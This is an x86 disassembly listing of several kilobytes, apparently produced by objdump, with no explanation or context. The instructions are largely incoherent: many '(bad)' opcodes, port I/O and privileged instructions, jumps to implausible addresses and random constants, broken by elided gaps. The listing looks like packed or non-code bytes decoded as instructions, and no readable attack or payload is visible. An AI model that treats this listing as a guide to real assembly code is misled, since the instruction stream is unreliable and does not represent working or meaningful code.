  43a5f3:	add    edx,DWORD PTR [ebx+0x0]
  43a5f6:	jb     0x43a57a
  43a5f8:	adc    ecx,DWORD PTR [esi+eiz*2+0x7788ffbf]
  43a5ff:	inc    esi
  43a600:	ror    BYTE PTR [edi],0xf0
  43a603:	and    dh,bh
  43a605:	inc    DWORD PTR [eax]
	...
  43a623:	add    BYTE PTR [ebx],ch
  43a625:	sub    eax,0x17e564e
  43a62a:	push   eax
  43a62b:	jmp    DWORD PTR [ecx-0x19]
  43a62e:	or     al,0x40
  43a630:	fs inc esi
  43a632:	ror    BYTE PTR [edi],0xe0
  43a635:	ss idiv edi
  43a638:	dec    ebx
  43a639:	idiv   DWORD PTR [ecx]
  43a63b:	adc    BYTE PTR [ecx],dh
  43a63d:	push   edi
  43a63e:	(bad)  
  43a63f:	jmp    DWORD PTR [ebp*1-0x45f3bc77]
  43a646:	inc    ebx
  43a647:	sti    
  43a648:	xor    al,0x84
  43a64a:	adc    ecx,DWORD PTR [eax]
  43a64c:	and    DWORD PTR [edi-0x700e7701],edi
  43a652:	xor    esi,eax
  43a654:	sbb    edi,ebx
  43a656:	ins    BYTE PTR es:[edi],dx
  43a657:	add    esp,esi
  43a659:	inc    BYTE PTR [edx+0x3a739c3d]
  43a65f:	add    BYTE PTR [esi+0x7c],cl
  43a662:	dec    edx
  43a663:	mov    DWORD PTR [edi],edx
  43a665:	pusha  
  43a666:	xchg   DWORD PTR [ebx-0x44],esi
  43a669:	or     ebp,0x6a
  43a66c:	out    dx,al
  43a66d:	xor    DWORD PTR [ebx-0xc],0x6d
  43a671:	shr    DWORD PTR [ebx],0xff
  43a674:	jae    0x43a66e
  43a676:	inc    ecx
  43a677:	sub    al,0x24
  43a679:	das    
  43a67a:	div    DWORD PTR [ebp+0x40]
  43a67d:	idiv   DWORD PTR [ecx]
  43a67f:	xor    BYTE PTR [ebx],ch
  43a681:	imul   ebx,esi,0x10
  43a684:	fs (bad) 
  43a686:	xor    al,dh
	...
  43a6a4:	add    BYTE PTR [eax],al
  43a6a6:	shr    BYTE PTR [ecx+0x4a],0x56
  43a6aa:	or     eax,0xed3e71bb
  43a6af:	mov    eax,0x989d4471
  43a6b4:	xor    DWORD PTR [ecx+eax*4-0x30],0x28
  43a6b9:	add    BYTE PTR [ebx+0x3ffd9931],0x29
  43a6c0:	test   DWORD PTR [ecx+edi*2-0x11],esi
  43a6c4:	inc    eax
  43a6c5:	sbb    al,0xc3
  43a6c7:	sbb    ebx,ebp
  43a6c9:	psubb  mm5,QWORD PTR [eax+0x6cde38fe]
  43a6d0:	repz cmp eax,0x67
  43a6d4:	(bad)  
  43a6d5:	call   DWORD PTR [esi-0x699e7155]
  43a6db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a6dc:	hlt    
  43a6dd:	popa   
  43a6de:	dec    esp
  43a6df:	add    BYTE PTR [ecx],al
  43a6e1:	mov    dh,cl
  43a6e3:	and    ch,dh
  43a6e5:	mov    cl,0x4d
  43a6e7:	imul   edx,DWORD PTR [ebx+0x3e],0x343fdff1
  43a6ee:	gs or  al,BYTE PTR gs:[edx]
  43a6f2:	mov    cs,WORD PTR [eax-0x7e]
  43a6f5:	jle    0x43a6c4
  43a6f7:	arpl   WORD PTR ds:0x967b4e89,bp
  43a6fd:	inc    eax
  43a6fe:	mov    ah,0xaa
  43a700:	cmp    DWORD PTR [edi+0x70],0x6f
  43a704:	std    
  43a705:	rcl    DWORD PTR [eax-0x62],0xfd
  43a709:	or     al,BYTE PTR [eax]
	...
  43a727:	add    BYTE PTR [eax+0xdfffeb3],cl
  43a72d:	fadd   QWORD PTR [ecx-0x1d]
  43a730:	fiadd  DWORD PTR [edx+0x7e50c183]
  43a736:	(bad)  
  43a737:	out    0xb3,eax
  43a739:	dec    ebx
  43a73a:	(bad)  
  43a73b:	jmp    DWORD PTR [edi]
  43a73d:	push   edi
  43a73e:	push   ss
  43a73f:	cwde   
  43a740:	scas   eax,DWORD PTR es:[edi]
  43a741:	add    BYTE PTR [esi+0x1cbd9803],ah
  43a747:	xor    al,0xb5
  43a749:	ror    BYTE PTR [edi-0x6c74687c],1
  43a74f:	ins    DWORD PTR es:[edi],dx
  43a750:	xchg   ecx,eax
  43a751:	jns    0x43a794
  43a753:	fwait
  43a754:	sbb    bh,ah
  43a756:	cmp    al,BYTE PTR [ebx+ecx*4+0xd024a80]
  43a75d:	add    BYTE PTR [eax+0x40],ah
  43a760:	shl    DWORD PTR [esi+0xd0212],0x6e
  43a767:	mov    ebp,0x43e9004c
  43a76c:	(bad)  
  43a76d:	bndcn  bnd2,[ebx+0x0]
  43a772:	jmp    0x7bc73f7a
  43a777:	xchg   DWORD PTR [edi+0x79],eax
  43a77a:	cwde   
  43a77b:	jbe    0x43a778
  43a77d:	iret   
  43a77e:	cwde   
  43a77f:	fwait
  43a780:	adc    eax,0xb083e1b7
  43a785:	(bad)  
  43a786:	imul   ecx,ecx,0xffffff8e
  43a789:	rol    BYTE PTR [eax+0x26],1
	...
  43a7a8:	add    BYTE PTR [eax],al
  43a7aa:	pop    esp
  43a7ab:	cwde   
  43a7ac:	lock imul edx,DWORD PTR [edx-0x67fc16e2],0xffffffc2
  43a7b4:	fs aam 0x33
  43a7b7:	jns    0x43a7d2
  43a7b9:	in     al,dx
  43a7ba:	bound  ebx,QWORD PTR [edx+0x25]
  43a7bd:	add    al,0xf6
  43a7bf:	adc    cl,cl
  43a7c1:	push   ss
  43a7c2:	dec    ebp
  43a7c3:	add    BYTE PTR [eax-0x79],dh
  43a7c6:	inc    edx
  43a7c7:	(bad)  
  43a7c8:	call   0xd984c9d0
  43a7cd:	xchg   DWORD PTR [ebx],ecx
  43a7cf:	jp     0x43a752
  43a7d1:	sbb    DWORD PTR [edi+0x79],0xffffffd3
  43a7d5:	or     ebx,DWORD PTR [eax]
  43a7d7:	sar    bh,0xe8
  43a7da:	mov    ebp,DWORD PTR [eax+0x36]
  43a7dd:	jbe    0x43a794
  43a7df:	(bad)  
  43a7e0:	push   ecx
  43a7e1:	data16 add al,0x4c
  43a7e4:	pop    gs
  43a7e6:	push   cs
  43a7e7:	xchg   DWORD PTR [esi-0x43],edi
  43a7ea:	adc    DWORD PTR [eax],eax
  43a7ec:	add    BYTE PTR [edx],dl
  43a7ee:	inc    esi
  43a7ef:	in     eax,dx
  43a7f0:	das    
  43a7f1:	rcl    DWORD PTR [ecx],cl
  43a7f3:	loop   0x43a7f5
  43a7f5:	xchg   edi,eax
  43a7f6:	(bad)  
  43a7f7:	adc    esp,esp
  43a7f9:	(bad)  [esi+0x78]
  43a7fc:	xchg   DWORD PTR [edx+0x6d],ebp
  43a7ff:	(bad)  
  43a800:	(bad)  
  43a801:	call   0x2b6e531
  43a806:	cmp    DWORD PTR [ebp-0x52],esi
  43a809:	mov    ebp,0xe000011
	...
  43a82a:	add    BYTE PTR [eax],al
  43a82c:	hlt    
  43a82d:	scas   eax,DWORD PTR es:[edi]
  43a82e:	pop    gs
  43a830:	push   cs
  43a831:	xchg   DWORD PTR [esi-0x5f],edi
  43a834:	or     DWORD PTR [eax],eax
  43a836:	add    BYTE PTR [edx+0x2703ecc7],dh
  43a83c:	inc    esp
  43a83d:	jno    0x43a83f
  43a83f:	aas    
  43a840:	inc    esi
  43a841:	jne    0x43a857
  43a843:	stc    
  43a844:	add    eax,0x4562ffc0
  43a849:	jno    0x43a8a5
  43a84b:	das    
  43a84c:	sar    BYTE PTR [edx+0x7ee3e903],0x1c
  43a853:	popf   
  43a854:	push   ds
  43a855:	sar    bh,0x1e
  43a858:	mov    ah,BYTE PTR [edi-0x7a]
  43a85b:	daa    
  43a85c:	sub    eax,0xe2a984d3
  43a861:	jbe    0x43a8ad
  43a863:	sahf   
  43a864:	cmp    edi,DWORD PTR [esi+0x41]
  43a867:	in     eax,0x8b
  43a869:	xor    al,0x4
  43a86b:	cli    
  43a86c:	into   
  43a86d:	ja     0x43a7f2
  43a86f:	add    BYTE PTR [edi+ebp*2-0x7],dh
  43a873:	dec    edi
  43a874:	inc    ebx
  43a875:	fiadd  DWORD PTR [ecx-0xd8157ba]
  43a87b:	(bad)  
  43a87c:	mov    eax,0xa9ff500a
  43a881:	(bad)  
  43a882:	cmovo  esi,DWORD PTR [esi+eax*4-0x3cd6ebc0]
  43a88a:	outs   dx,BYTE PTR ds:[esi]
  43a88b:	add    edx,DWORD PTR [edx+eax*4-0x33]
  43a88f:	mov    eax,DWORD PTR [eax]
	...
  43a8ad:	add    BYTE PTR [edx-0x473f7aed],bh
  43a8b3:	or     dl,BYTE PTR [eax-0x1]
  43a8b6:	pop    ecx
  43a8b7:	(bad)  
  43a8b8:	or     al,0x40
  43a8ba:	xchg   BYTE PTR fs:[eax],al
  43a8bd:	test   DWORD PTR [edi+ebp*2],esi
  43a8c0:	stc    
  43a8c1:	dec    edi
  43a8c2:	add    ebx,edx
  43a8c4:	jp     0x43a942
  43a8c6:	dec    eax
  43a8c7:	adc    eax,DWORD PTR [eax]
  43a8c9:	je     0x43a948
  43a8cb:	xchg   BYTE PTR [eax+0x33558],al
  43a8d1:	test   esp,esi
  43a8d3:	outs   dx,BYTE PTR ds:[esi]
  43a8d4:	or     edx,DWORD PTR [eax+0x43]
  43a8d7:	mov    eax,0x324014e
  43a8dc:	not    DWORD PTR ds:0x400c84
  43a8e2:	lahf   
  43a8e3:	mov    DWORD PTR [esi+0x1],edx
  43a8e6:	and    al,0x3
  43a8e8:	test   eax,eax
  43a8ea:	mov    eax,0xa7ff4ffc
  43a8ef:	test   BYTE PTR [eax+0x2f554],al
  43a8f5:	test   DWORD PTR [edi+esi*2+0xea34ffd],esp
  43a8fc:	rcl    BYTE PTR [eax],0x34
  43a8ff:	cld    
  43a900:	add    BYTE PTR [esi+0x314],0xd
  43a907:	in     al,0x43
  43a909:	jae    0x43a919
  43a90b:	cmp    DWORD PTR [ecx-0x7c19692e],eax
	...
  43a92d:	add    BYTE PTR [eax],al
  43a92f:	add    BYTE PTR ds:0x41bf8169,cl
  43a935:	dec    ebx
  43a936:	in     al,dx
  43a937:	inc    DWORD PTR [edx-0x1a]
  43a93a:	adc    bl,BYTE PTR [esi+edi*8]
  43a93d:	test   al,0xfe
  43a93f:	cmp    al,0xf
  43a941:	push   0x7b21fffe
  43a946:	in     al,dx
  43a947:	jmp    DWORD PTR [ecx+ebp*2]
  43a94a:	in     al,dx
  43a94b:	or     eax,0x8bf68a
  43a950:	or     eax,0x21147f69
  43a955:	push   ebp
  43a956:	mov    esi,0x1e8dff
  43a95b:	add    DWORD PTR ds:0xbd296669,ecx
  43a961:	adc    eax,0xb1bb5a81
  43a966:	inc    esp
  43a967:	add    ecx,DWORD PTR ds:0x870fc6e2
  43a96d:	call   0xdd50a975
  43a972:	inc    ebx
  43a973:	jae    0x43a935
  43a975:	call   0x694ccd79
  43a97a:	ror    DWORD PTR [edx],cl
  43a97c:	sub    DWORD PTR [ecx+0x6556f9d8],0xb2efefb8
  43a986:	xchg   BYTE PTR [ebx],bl
  43a988:	add    esp,DWORD PTR [edi]
  43a98a:	fnstsw WORD PTR [ebx]
  43a98c:	lods   eax,DWORD PTR ds:[esi]
  43a98d:	cmp    ebp,ebx
  43a98f:	cmp    ebp,DWORD PTR [ebp+ebp*1+0x3c3e]
	...
  43a9b2:	scas   al,BYTE PTR es:[edi]
  43a9b3:	xor    eax,0x2ea83c21
  43a9b8:	rol    DWORD PTR [ebx+0x34d007c],1
  43a9be:	or     eax,0x91101400
  43a9c3:	(bad)  
  43a9c4:	dec    ebx
  43a9c5:	add    ecx,DWORD PTR ds:0xfa081400
  43a9cb:	aas    
  43a9cc:	lea    eax,ds:0xc270428a
  43a9d2:	or     BYTE PTR [ecx-0x44],ch
  43a9d5:	xchg   DWORD PTR [ebp+0xd03e8a2],ebx
  43a9db:	jmp    0x43a9d1
  43a9dd:	xchg   DWORD PTR [ebp-0x5f],edi
  43a9e0:	call   0xed2eb6e8
  43a9e5:	xor    al,0xcd
  43a9e7:	imul   esp,esi,0xa788c88c
  43a9ed:	adc    ch,BYTE PTR [edx+0x17]
  43a9f0:	gs xchg edx,eax
  43a9f2:	call   0x6503:0xf803e900
  43a9f9:	xchg   edx,eax
  43a9fa:	lods   eax,DWORD PTR ds:[esi]
  43a9fb:	add    cl,ch
  43a9fd:	add    ebx,eax
  43a9ff:	sti    
  43aa00:	aad    0x43
  43aa02:	jae    0x43aa06
  43aa04:	pop    esi
  43aa05:	inc    ebp
  43aa06:	mov    bh,BYTE PTR [edi+0x7c4d34f8]
  43aa0c:	xchg   edi,eax
  43aa0d:	add    bh,BYTE PTR [ecx-0x22785702]
  43aa13:	add    DWORD PTR [ebp+0x4],edi
	...
  43aa32:	add    BYTE PTR [eax],al
  43aa34:	mov    dl,0x47
  43aa36:	out    0x87,al
  43aa38:	mov    ebp,0xa2035cfb
  43aa3d:	inc    edi
  43aa3e:	clc    
  43aa3f:	xchg   DWORD PTR [ebp-0x6dfca2f1],edi
  43aa45:	inc    edi
  43aa46:	in     al,0x87
  43aa48:	pop    ebp
  43aa49:	(bad)  
  43aa4b:	add    eax,DWORD PTR [edx+0xe41f048]
  43aa51:	add    BYTE PTR [eax],al
  43aa53:	sbb    al,0x86
  43aa55:	push   0x8069c57e
  43aa5a:	jmp    0x43aa19
  43aa5c:	or     DWORD PTR [eax],eax
  43aa5e:	add    BYTE PTR [edx],bh
  43aa60:	pop    edx
  43aa61:	or     al,0x0
  43aa63:	clc    
  43aa64:	into   
  43aa65:	je     0x43aab1
  43aa67:	mov    fs,WORD PTR [esp+ecx*8]
  43aa6a:	adc    al,0x29
  43aa6c:	or     DWORD PTR [ebx-0x41],edi
  43aa6f:	cmc    
  43aa70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aa71:	or     DWORD PTR [ebx-0x33],0xa
  43aa75:	iret   
  43aa76:	gs add eax,0xe123c87c
  43aa7c:	mov    ecx,0x1bb8fdda
  43aa81:	or     al,0x68
  43aa83:	cld    
  43aa84:	into   
  43aa85:	je     0x43aa0a
  43aa87:	sub    DWORD PTR [ebp+0x2ac57ec8],eax
  43aa8d:	cld    
  43aa8e:	dec    ecx
  43aa8f:	mov    ah,0x45
  43aa91:	(bad)  
  43aa93:	arpl   WORD PTR [ebp+0x20],ax
  43aa96:	or     al,0x99
	...
  43aab4:	add    BYTE PTR [eax],al
  43aab6:	jbe    0x43aa3b
  43aab8:	dec    eax
  43aab9:	fidiv  WORD PTR [ecx]
  43aabb:	push   0xefe26
  43aac0:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  43aac2:	jge    0x43aa84
  43aac4:	and    ebx,ebp
  43aac6:	popf   
  43aac7:	enter  0x7d23,0xb6
  43aacb:	es mov bl,0xfe
  43aace:	mov    ebx,0xe97cbf7b
  43aad3:	iret   
  43aad4:	mov    dh,0xd1
  43aad6:	retf   0x35
  43aad9:	sar    DWORD PTR [edx+0x6d],1
  43aadc:	cli    
  43aadd:	ficom  WORD PTR [edx-0x701f8c4c]
  43aae3:	add    esp,DWORD PTR [eax]
  43aae5:	scas   eax,DWORD PTR es:[edi]
  43aae6:	iret   
  43aae7:	jae    0x43aae7
  43aae9:	(bad)  
  43aaea:	fild   WORD PTR [edx+eiz*2]
  43aaed:	add    BYTE PTR [edi-0x42],bh
  43aaf0:	loop   0x43aae8
  43aaf2:	mov    ecx,0x6f5bf5f2
  43aaf7:	call   0x3ba36e57
  43aafc:	push   ds
  43aafd:	add    al,0xb3
  43aaff:	add    DWORD PTR [esi+ecx*4],edx
  43ab02:	and    al,0xfc
  43ab04:	adc    BYTE PTR [ecx-0x78],0x26
  43ab08:	push   ecx
  43ab09:	and    al,0x3d
  43ab0b:	jae    0x516a1f62
  43ab11:	sub    BYTE PTR ds:0x358afe4f,ch
  43ab17:	dec    ebx
  43ab18:	(bad)  
  43ab19:	inc    DWORD PTR [eax]
	...
  43ab37:	add    BYTE PTR [ecx+eax*8-0x799e0002],dh
  43ab3e:	out    0x83,al
  43ab40:	dec    eax
  43ab41:	push   edi
  43ab42:	add    ecx,0x6aa64fe9
  43ab48:	test   BYTE PTR fs:[ebx-0x4],cl
  43ab4c:	jmp    0xe995c99f
  43ab51:	dec    edi
  43ab52:	out    0x51,al
  43ab54:	in     eax,dx
  43ab55:	inc    edi
  43ab56:	loop   0x43ab40
  43ab58:	inc    ebx
  43ab59:	lods   eax,DWORD PTR ds:[esi]
  43ab5a:	cmc    
  43ab5b:	(bad)  
  43ab5c:	jle    0x43ab5f
  43ab5e:	dec    edx
  43ab5f:	push   DWORD PTR [edx+ecx*2-0xdcb0001]
  43ab66:	adc    ebp,DWORD PTR [eax+eiz*2]
  43ab69:	aas    
  43ab6a:	cli    
  43ab6b:	imul   esp,DWORD PTR [edx+esi*8],0x3f50fc13
  43ab72:	cli    
  43ab73:	test   ah,dh
  43ab75:	push   0x4
  43ab77:	push   eax
  43ab78:	cdq    
  43ab79:	cmp    ah,dl
  43ab7b:	push   eax
  43ab7c:	cmp    al,0xf3
  43ab7e:	(bad)  
  43ab80:	or     eax,0x63be464a
  43ab85:	sub    cl,BYTE PTR [ecx+0x142296f0]
  43ab8b:	sti    
  43ab8c:	mov    ebp,0xdfffd5c
  43ab91:	fimul  WORD PTR [ebx-0x196f201]
  43ab97:	push   eax
  43ab98:	ja     0x43ab9f
  43ab9a:	mov    ebp,esi
	...
  43abb8:	add    BYTE PTR [eax],al
  43abba:	push   ds
  43abbb:	mov    bh,0xd6
  43abbd:	out    0x7,eax
  43abbf:	mov    BYTE PTR [ecx-0x6],bh
  43abc2:	nop
  43abc3:	test   al,0xf7
  43abc5:	or     eax,edx
  43abc7:	je     0x43abeb
  43abc9:	or     al,0x5d
  43abcb:	out    dx,al
  43abcc:	inc    esp
  43abcd:	out    0x7a,eax
  43abcf:	jbe    0x43ac4c
  43abd1:	cli    
  43abd2:	dec    edx
  43abd3:	add    edi,DWORD PTR [esi]
  43abd5:	add    ecx,DWORD PTR ds:0x923f7da
  43abdb:	out    dx,al
  43abdc:	ds cli 
  43abde:	sbb    DWORD PTR ds:0xfd01fb10,eax
  43abe4:	cmovle esi,DWORD PTR [ebp+0x61]
  43abe8:	sar    edx,1
  43abea:	jp     0x43ac12
  43abec:	adc    BYTE PTR [eax],al
  43abee:	dec    edi
  43abef:	fs (bad) 
  43abf1:	push   esp
  43abf2:	xchg   esi,eax
  43abf3:	xor    al,0x81
  43abf5:	jecxz  0x43ac5c
  43abf7:	in     eax,dx
  43abf8:	ret    0x8e0b
  43abfb:	add    al,0x20
  43abfd:	dec    edi
  43abfe:	mov    ebx,0x48f77fb1
  43ac03:	push   ecx
  43ac04:	sub    BYTE PTR [esi+0xc],0x69
  43ac08:	dec    BYTE PTR [edx]
  43ac0a:	xchg   ebx,eax
  43ac0b:	mov    ah,0xfd
  43ac0d:	dec    DWORD PTR ds:0x1afa7be6
  43ac13:	fidiv  DWORD PTR [eax]
  43ac15:	add    DWORD PTR ds:0xa17ce900,ecx
  43ac1b:	pop    es
  43ac1c:	ficom  DWORD PTR [esi]
	...
  43ac3a:	add    BYTE PTR [eax],al
  43ac3c:	lea    ecx,[ebx]
  43ac3e:	sub    DWORD PTR [edx+edx*4],eax
  43ac41:	js     0x43aca6
  43ac43:	jl     0x43ac5c
  43ac45:	jl     0x43ac6a
  43ac47:	add    ecx,DWORD PTR ds:0x2ecf6600
  43ac4d:	or     al,0xb2
  43ac4f:	aam    0xe7
  43ac51:	or     ecx,DWORD PTR [ecx-0x29ffb2e9]
  43ac57:	pop    eax
  43ac58:	test   DWORD PTR [esp+eax*8-0x12ff68ed],edi
  43ac5f:	add    ecx,DWORD PTR ds:0xeefda87b
  43ac65:	leave  
  43ac66:	adc    eax,0x5d0bb7d5
  43ac6b:	pop    ss
  43ac6c:	dec    ebp
  43ac6d:	add    BYTE PTR [ebp+0x43],ch
  43ac70:	and    eax,0x3fd11310
  43ac75:	jno    0x43ac52
  43ac77:	or     edx,DWORD PTR [esi+0x4d17850b]
  43ac7d:	add    BYTE PTR [eax-0x21],ah
  43ac80:	cs or  al,0xa6
  43ac83:	cmp    cl,ah
  43ac85:	sbb    ebx,ecx
  43ac87:	call   DWORD PTR [esi-0x61]
  43ac8a:	adc    BYTE PTR [eax+0x33],ah
  43ac8d:	add    BYTE PTR [edx],dh
  43ac8f:	mov    bl,0xe
  43ac91:	(bad)  
  43ac92:	call   0xe8f4129a
  43ac97:	add    cl,BYTE PTR ds:0xd97cb200
  43ac9d:	pop    es
  43ac9e:	adc    dl,BYTE PTR [esi]
	...
  43acbc:	add    BYTE PTR [eax],al
  43acbe:	leave  
  43acbf:	or     ebp,DWORD PTR [ecx+0x65588a03]
  43acc5:	js     0x43acfe
  43acc7:	add    DWORD PTR [ebp+0x7b],esp
  43acca:	xor    dh,BYTE PTR [ecx-0x1]
  43accd:	call   0xee966f12
  43acd2:	clc    
  43acd3:	xchg   ebx,eax
  43acd4:	adc    ebp,DWORD PTR [ecx]
  43acd6:	adc    DWORD PTR [edi+0x36f90543],eax
  43acdc:	pop    esp
  43acdd:	or     eax,0xce01ec1d
  43ace2:	sbb    al,0x20
  43ace4:	adc    eax,0x7fe81129
  43ace9:	in     eax,0xe
  43aceb:	add    BYTE PTR [edi+0x1e],cl
  43acee:	data16 in al,dx
  43acf0:	pop    es
  43acf1:	scas   al,BYTE PTR es:[edi]
  43acf2:	cld    
  43acf3:	fwait
  43acf4:	adc    ebp,DWORD PTR [ecx]
  43acf6:	adc    ecx,esi
  43acf8:	jl     0x43ace7
  43acfa:	push   esp
  43acfb:	push   es
  43acfc:	test   BYTE PTR [ecx+edx*1-0x32690000],ch
  43ad03:	sbb    al,0x10
  43ad05:	jmp    0xe:0xe9b57b07
  43ad0c:	repnz sub eax,0xf5100fed
  43ad12:	int    0xc1
  43ad14:	push   edx
  43ad15:	data16 cld 
  43ad17:	not    DWORD PTR [ebx]
  43ad19:	test   eax,0x6cef790e
  43ad1e:	inc    DWORD PTR ds:0x8884
	...
  43ad40:	or     DWORD PTR [eax],eax
  43ad42:	add    BYTE PTR [ebp+ecx*2+0x1c],dh
  43ad46:	sbb    BYTE PTR [ecx-0x430532a5],bl
  43ad4c:	push   ss
  43ad4d:	jne    0x43ad63
  43ad4f:	gs std 
  43ad51:	mov    edi,0x5d16bff
  43ad56:	test   BYTE PTR [eax+0x9],dh
  43ad59:	add    BYTE PTR [eax],al
  43ad5b:	or     DWORD PTR [esi],0x75
  43ad5e:	je     0x43ad41
  43ad60:	(bad)  
  43ad61:	in     al,dx
  43ad62:	and    eax,DWORD PTR [eax]
  43ad64:	pusha  
  43ad65:	cmc    
  43ad66:	outs   dx,BYTE PTR ds:[esi]
  43ad67:	and    al,0x48
  43ad69:	fs cli 
  43ad6b:	aas    
  43ad6c:	xor    al,0xfc
  43ad6e:	dec    ebp
  43ad6f:	(bad)  
  43ad70:	cmp    DWORD PTR [esi+ecx*1+0x68e12440],eax
  43ad77:	imul   eax
  43ad79:	pop    ds
  43ad7a:	adc    BYTE PTR [eax],al
  43ad7c:	in     al,dx
  43ad7d:	add    eax,DWORD PTR [eax]
  43ad7f:	je     0x43ad69
  43ad81:	ss shr bl,0x1
  43ad85:	push   edi
  43ad86:	dec    ebp
  43ad87:	(bad)  
  43ad88:	fnstenv [ebx+0xe]
  43ad8b:	inc    eax
  43ad8c:	hlt    
  43ad8d:	xchg   dl,dh
  43ad8f:	call   FWORD PTR [eax]
  43ad91:	push   edi
  43ad92:	fs add bl,ah
  43ad95:	mov    dl,0xba
  43ad97:	push   eax
  43ad98:	cld    
  43ad99:	adc    al,0x1
  43ad9b:	add    BYTE PTR [edx+ebp*8+0x10930873],dh
  43ada2:	call   0x43adbb
	...
  43adbf:	add    BYTE PTR [eax],al
  43adc1:	add    ah,ah
  43adc3:	add    esp,ebx
  43adc5:	cmp    eax,0xc1cab2a3
  43adca:	mov    WORD PTR [ebx],ss
  43adcc:	mov    DWORD PTR [eax+ecx*8+0x17],eax
  43add0:	pop    es
  43add1:	mov    bh,0xe5
  43add3:	pop    esp
  43add4:	cli    
  43add5:	(bad)  
  43add6:	mov    ecx,0x184488fb
  43addb:	sbb    al,0xc1
  43addd:	jmp    0xdc560966
  43ade2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ade3:	add    ecx,DWORD PTR [ebp-0x76dff7bc]
  43ade9:	push   esp
  43adea:	sbb    BYTE PTR [eax],ah
  43adec:	mov    DWORD PTR [eax+ecx*1+0x34],ecx
  43adf0:	call   0xf62e617f
  43adf5:	jmp    0x43ae57
  43adf7:	jmp    0xffc2:0x350d2833
  43adfe:	inc    ebx
  43adff:	je     0x43adeb
  43ae01:	adc    ecx,ebp
  43ae03:	pop    eax
  43ae04:	jne    0x43ae3a
  43ae06:	jmp    0x2c437017
  43ae0b:	dec    esp
  43ae0c:	scas   al,BYTE PTR es:[edi]
  43ae0d:	or     eax,0x59d558cd
  43ae12:	ficomp WORD PTR [eax+0x2c2886dc]
  43ae18:	inc    edx
  43ae19:	pop    es
  43ae1a:	or     eax,0x8eeb8d2c
  43ae1f:	lods   al,BYTE PTR ds:[esi]
  43ae20:	fcomip st,st(1)
  43ae22:	adc    cl,bh
  43ae24:	push   ebp
  43ae25:	add    BYTE PTR ds:[eax],al
	...
  43ae44:	or     eax,0xf529ea65
  43ae49:	test   eax,0xe50d0012
  43ae4e:	inc    ebx
  43ae4f:	jae    0x43ae81
  43ae51:	adc    eax,DWORD PTR [ecx*4+0x67d3ed48]
  43ae58:	cwde   
  43ae59:	pop    ds
  43ae5a:	xor    DWORD PTR [ecx],ebp
  43ae5c:	mov    ch,0xfa
  43ae5e:	pop    ss
  43ae5f:	add    BYTE PTR ds:0x800fea86,cl
  43ae65:	and    ebx,DWORD PTR [eax+0x776520fa]
  43ae6b:	je     0x43ae82
  43ae6d:	or     DWORD PTR [ecx+0x14],edi
  43ae70:	push   ecx
  43ae71:	ins    BYTE PTR es:[edi],dx
  43ae72:	mov    esi,0x775da7ff
  43ae77:	je     0x43ae96
  43ae79:	(bad)  
  43ae7a:	jmp    0x20fb:0x653820b
  43ae81:	ins    DWORD PTR es:[edi],dx
  43ae82:	or     DWORD PTR [eax+0xd],eax
  43ae85:	xor    BYTE PTR [edx+0xb],al
  43ae88:	or     eax,0x431ffb2f
  43ae8d:	cdq    
  43ae8e:	inc    BYTE PTR [ebx]
  43ae90:	loope  0x43ae91
  43ae92:	icebp  
  43ae93:	imul   esp,DWORD PTR [ebp-0x6efc16f4],0x3f
  43ae9a:	pushf  
  43ae9b:	add    edx,esi
  43ae9d:	aas    
  43ae9e:	test   al,0x45
  43aea0:	push   cs
  43aea1:	add    BYTE PTR [edx],al
  43aea3:	pop    ds
  43aea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aea5:	adc    ebp,DWORD PTR [ecx+0x3]
	...
  43aec3:	add    BYTE PTR [eax],al
  43aec5:	add    al,al
  43aec7:	jp     0x43aecd
  43aec9:	jb     0x43aed4
  43aecb:	and    BYTE PTR [ebx],cl
  43aecd:	lds    ebx,FWORD PTR [edx]
  43aecf:	add    bh,BYTE PTR [ebx]
  43aed1:	lea    ebx,[ecx-0xadcab05]
  43aed7:	test   bl,dh
  43aed9:	add    ecx,DWORD PTR ds:0x22efa884
  43aedf:	sub    esp,edi
  43aee1:	and    edx,ecx
  43aee3:	shr    eax,0xee
  43aee6:	sbb    ch,BYTE PTR [ebp+0x3b]
  43aee9:	adc    al,0x8a
  43aeeb:	mov    ebx,0xf86178d4
  43aef0:	nop
  43aef1:	scas   al,BYTE PTR es:[edi]
  43aef2:	shr    DWORD PTR [ebp-0x67],1
  43aef5:	ins    BYTE PTR es:[edi],dx
  43aef6:	sbb    ch,BYTE PTR [ebp+0x1b]
  43aef9:	adc    dh,al
  43aefb:	repz clc 
  43aefd:	shl    DWORD PTR [edi+0x1978f0f3],1
  43af03:	clc    
  43af04:	aam    0xc3
  43af06:	stos   BYTE PTR es:[edi],al
  43af07:	retf   
  43af08:	adc    eax,DWORD PTR [esi+0x12]
  43af0b:	add    BYTE PTR [ecx*4+0x23eb76a6],dl
  43af12:	mov    bh,0xc1
  43af14:	call   0xdbbc8c18
  43af19:	pop    es
  43af1a:	stc    
  43af1b:	push   ds
  43af1c:	inc    ecx
  43af1d:	cmp    DWORD PTR [eax],ebx
  43af1f:	add    cl,ch
  43af21:	jg     0x43aed5
  43af23:	hlt    
  43af24:	loopne 0x43af62
  43af26:	and    BYTE PTR [eax],ah
  43af28:	add    BYTE PTR ds:0x0,dl
	...
  43af46:	add    BYTE PTR [eax],al
  43af48:	dec    ecx
  43af49:	ins    DWORD PTR es:[edi],dx
  43af4a:	jae    0x43af25
  43af4c:	aad    0xf3
  43af4e:	(bad)  
  43af50:	dec    ebx
  43af51:	adc    ebx,edi
  43af53:	xchg   esp,eax
  43af54:	push   ss
  43af55:	pop    eax
  43af56:	push   0x14
  43af58:	lds    ebp,FWORD PTR [ecx-0x1a]
  43af5b:	stc    
  43af5c:	mov    ch,0xf3
  43af5e:	adc    eax,DWORD PTR [esi]
  43af60:	and    edi,ebp
  43af62:	push   ecx
  43af63:	(bad)  
  43af64:	cmp    BYTE PTR ds:0x12dadcfb,al
  43af6a:	inc    eax
  43af6b:	jmp    0xfa017ba4
  43af70:	push   cs
  43af71:	rol    DWORD PTR [esi+0x20047bcd],cl
  43af77:	mov    bh,0xce
  43af79:	ins    BYTE PTR es:[edi],dx
  43af7a:	(bad)  
  43af7b:	ss xchg bl,dh
  43af7e:	or     edi,DWORD PTR ds:0xddf75828
  43af84:	push   cs
  43af85:	add    BYTE PTR [ecx+ebp*4-0xbc8eb23],al
  43af8c:	cs dec esp
